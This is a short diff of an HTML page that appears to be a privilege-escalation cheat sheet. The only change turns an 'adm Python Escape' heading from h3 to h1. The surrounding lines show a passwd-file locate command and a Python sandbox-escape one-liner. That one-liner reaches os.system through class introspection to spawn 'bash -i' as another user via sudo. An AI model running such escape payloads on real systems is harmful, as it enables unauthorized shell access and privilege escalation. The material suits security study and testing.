@@ -110,7 +110,7 @@ It is important to note that there are User Enumeration commands among the Syste
 </span></span><span style="display:flex;"><span># locate passwd | more</span>
 </code></div>
 </code>
-</pre><h3 id="adm-python-esc">adm Python Escape</h3>
+</pre><h1 id="adm-python-esc">adm Python Escape</h1>
 </code></pre>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># echo 'print(().__class__.__mro__[1].__subclasses__()[144].__init__.__globals__["__builtins__"]["__loader__"]().load_module("builtins").__import__("os").system("bash -i"))' > /tmp/lm && sudo -u jack_adm /user/bin/safe_python /tmp/lm   </span>
 </code></div>
